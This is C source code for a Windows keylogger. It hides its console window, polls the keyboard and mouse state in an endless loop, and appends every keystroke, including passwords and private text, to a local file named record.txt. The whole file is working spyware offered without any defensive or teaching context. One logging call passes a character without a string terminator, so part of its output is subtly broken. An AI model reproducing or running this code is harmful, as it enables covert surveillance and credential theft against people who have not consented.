#include <stdio.h>
#include <windows.h>
#include <stdlib.h>

void StealthMode()
{
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);
}

void Log(const char *text)
 {
    FILE *logfile;
    logfile = fopen("record.txt", "a");
    if (logfile == NULL)
        {
        printf("Error: Unable to open file.\n");
        exit(1);
    }
    fprintf(logfile, "%s", text);
    fclose(logfile);
}

int InputKey(int key) {
    char character = key;
    if (key >= 32 && key <= 126)
        {
        int isShiftPressed = GetAsyncKeyState(VK_SHIFT) & 0x8000;
        if (isShiftPressed)
         {
            character = (char)toupper(character);
        }
    else
        {
            character = (char)tolower(character);
        }
    }

    switch (key)
    {
    case VK_SPACE:
        printf("<space> ");
        Log(" <space> ");
        break;
    case VK_RETURN:
        printf(" <enter> ");
        Log(" <enter> ");
        break;
    case VK_SHIFT:
        printf(" <shift> ");
        Log(" <shift> ");
        break;
    case VK_BACK:
        printf(" <BACKSPACE> ");
        Log(" <BACKSPACE> ");
        break;
    case VK_RBUTTON:
        printf(" <rclick> ");
        Log(" <rclick> ");
        break;
    case VK_LBUTTON:
        printf(" <lclick> ");
        Log(" <lclick> ");
        break;
    case VK_MENU:
        printf(" <alt> ");
        Log(" <alt> ");
        break;
    case VK_CONTROL:
        printf(" <ctrl> ");
        Log(" <ctrl> ");
        break;
    case VK_LEFT:
        printf(" <left> ");
        Log(" <left> ");
        break;
    case VK_RIGHT:
        printf(" <right> ");
        Log(" <right> ");
        break;
    case VK_UP:
        printf(" <up> ");
        Log(" <up> ");
        break;
    case VK_DOWN:
        printf(" <down> ");
        Log(" <down> ");
        break;
    default:
        printf("%c", character);
        Log(&character);
        break;
    }
    return 1;
}

void Key_Logger_Tracing()
{
    int key;
    while (1)
        {
        Sleep(10);
        for (key = 8; key <= 190; key++)
         {
            if (GetAsyncKeyState(key) == -32767)
             {
                if (InputKey(key) == FALSE)
                {
                    char str[2] = {(char)key, '\0'};
                    Log(str);
                }
            }
        }
    }
}

int main()
 {
    StealthMode();
    FILE *file;
    file = fopen("record.txt", "r");
    if (file == NULL) {
        file = fopen("record.txt", "w");
        if (file == NULL) {
            printf("Error: Unable to create file.\n");
            exit(1);
        }
        fprintf(file, "");
        fclose(file);
    }
    else
        {
        fclose(file);
    }

    Key_Logger_Tracing();

    return 0;
}
